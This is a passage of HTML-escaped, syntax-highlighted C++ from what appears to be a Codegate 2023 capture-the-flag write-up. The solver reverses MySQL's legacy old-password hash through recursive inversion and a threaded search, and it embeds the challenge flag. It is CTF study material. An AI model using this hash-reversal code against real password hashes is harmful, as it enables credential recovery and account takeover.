class=&#34;line&#34;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;163&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;164&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;165&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;166&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;167&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;168&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;169&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;170&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;171&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;172&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;173&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;174&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;175&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;176&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;177&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;178&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;179&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;180&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;181&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;182&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;183&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;184&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;185&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;186&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;187&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;188&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;189&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;190&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;191&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;193&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;194&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;195&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;196&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;197&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;198&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;199&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;200&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;201&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;202&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;203&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;204&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stddef.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdint.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;thread&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;mutex&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;vector&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;unordered_map&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;atomic&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;title&#34;&gt;oldpw_rev&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; *pnr, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; *pnr2, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; add,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *cc, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; len)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; nr, nr2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; c, u, e, y;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (len == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nr = *pnr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nr2 = *pnr2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    c = cc[len - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    add -= c;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    u = nr2 - nr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    u = nr2 - ((u &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) ^ nr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    u = nr2 - ((u &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) ^ nr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nr2 = nr2 - ((u &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) ^ nr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nr2 &amp;amp;= &lt;span class=&#34;number&#34;&gt;0x7FFFFFFF&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    y = nr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (e = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; e &amp;lt; &lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;; e ++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; z, g;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        z = (e + add) * c;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        g = (e ^ z) &amp;amp; &lt;span class=&#34;number&#34;&gt;0x3F&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (g == (y &amp;amp; &lt;span class=&#34;number&#34;&gt;0x3F&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            x = e;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            x = y ^ (z + (x &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            x = y ^ (z + (x &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            x = y ^ (z + (x &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            nr = y ^ (z + (x &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            nr &amp;amp;= &lt;span class=&#34;number&#34;&gt;0x7FFFFFFF&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;oldpw_rev&lt;/span&gt;(&amp;amp;nr, &amp;amp;nr2, add, cc, len - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                *pnr = nr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                *pnr2 = nr2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;forward&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *cc, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; len, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; *nr, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; *nr2, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; *add)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; tmp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; len; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (cc[i] == &lt;span class=&#34;string&#34;&gt;&amp;#x27; &amp;#x27;&lt;/span&gt; || cc[i] == &lt;span class=&#34;string&#34;&gt;&amp;#x27;\t&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        tmp = cc[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *nr ^= (((*nr &amp;amp; &lt;span class=&#34;number&#34;&gt;63&lt;/span&gt;) + *add) * tmp) + (*nr &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *nr2 += (*nr2 &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; ) ^ *nr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *add += tmp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; mask = (((&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt;)&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;31&lt;/span&gt;) - (&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt;)&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;// 111....11, 31bits&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    *nr &amp;amp;= mask;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    *nr2 &amp;amp;= mask;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// printf(&amp;quot;hash: %x %x\n&amp;quot;, *nr, *nr2);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;calc&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *cc, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; len, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; *nr, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; *nr2)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	*nr = &lt;span class=&#34;number&#34;&gt;1345345333&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	*nr2 = &lt;span class=&#34;number&#34;&gt;0x12345671&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; add = &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    forward(cc, len, nr, nr2, &amp;amp;add);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Ans&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;pair_hash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;template&lt;/span&gt; &amp;lt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;T1&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;T2&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;std::&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;operator&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; std::pair&amp;lt;T1, T2&amp;gt; &amp;amp;pair)&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; std::&lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;&amp;lt;T1&amp;gt;()(pair.first) ^ std::&lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;&amp;lt;T2&amp;gt;()(pair.second);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;bool&lt;/span&gt; ok_maps[&lt;span class=&#34;number&#34;&gt;65536&lt;/span&gt;] = &amp;#123;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;#125;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; nr, nr2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; cp[] = &lt;span class=&#34;string&#34;&gt;&amp;quot;codegate2023&amp;#123;Mysql_olD_P455woRD_I5_CoMP_bEEE_KE03&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nr = &lt;span class=&#34;number&#34;&gt;1345345333&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	nr2 = &lt;span class=&#34;number&#34;&gt;0x12345671&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; add = &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    forward(cp, &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)cp), &amp;amp;nr, &amp;amp;nr2, &amp;amp;add);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;nr: %x, nr2: %x, add: %x\n&amp;quot;&lt;/span&gt;, nr, nr2, add);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; fnr = nr, fnr2 = nr2, fadd = add;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; uadd = &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;, fuadd = fadd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fadd += uadd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; cs[] = &lt;span class=&#34;string&#34;&gt;&amp;quot;i_love_you&amp;#125;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    std::vector&amp;lt;std::thread&amp;gt; ths;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    std::mutex mtx;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    std::unordered_map&amp;lt;std::pair&amp;lt;&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt;, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt;&amp;gt;, Ans, pair_hash&amp;gt; maps;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    std::atomic&amp;lt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;&amp;gt; cnter&amp;#123;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;500&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;number&#34;&gt;20000&lt;/span&gt;; i++) &amp;#123; &lt;span class=&#34;comment&#34;&gt;// find possible `add` value &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; pnr = &lt;span class=&#34;number&#34;&gt;0x63686163&lt;/span&gt;, pnr2 = &lt;span class=&#34;number&#34;&gt;0x68613230&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; ans = &lt;span class=&#34;built_in&#34;&gt;oldpw_rev&lt;/span&gt;(&amp;amp;pnr, &amp;amp;pnr2, i, cs, &lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (ans != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ok_maps[i] = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;; i++) &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ths.&lt;span class=&#34;built_in&#34;&gt;emplace_back&lt;/span&gt;([&amp;amp;, i] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            std::vector&amp;lt;std::pair&amp;lt;std::pair&amp;lt;&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt;, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt;&amp;gt;, Ans&amp;gt;&amp;gt; all;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Ans 